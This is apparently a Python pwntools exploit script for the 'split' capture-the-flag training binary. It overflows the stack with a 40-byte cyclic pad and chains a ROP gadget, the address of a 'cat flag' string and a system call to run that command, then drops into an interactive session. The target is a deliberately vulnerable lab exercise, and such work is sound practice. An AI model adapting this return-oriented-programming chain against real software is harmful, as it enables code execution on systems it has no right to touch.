#!/usr/bin/python
from pwn import *

# t = pwn.process('./split')

elf = context.binary = ELF('./split')
info("%#x system",elf.symbols.system)
system = p64(elf.symbols.system)

print_flag = p64(elf.symbols.usefulString)

t = process(elf.path)

ptr_rop_gadget = 0x4007c3
string_cat_flag = 0x601060
systemcal_usefunction = 0x40074b

buf = b''
buf += cyclic(40,n=8)
buf += p64(ptr_rop_gadget)
buf += p64(string_cat_flag)
buf += p64(systemcal_usefunction)


t.sendline(buf)
t.interactive()

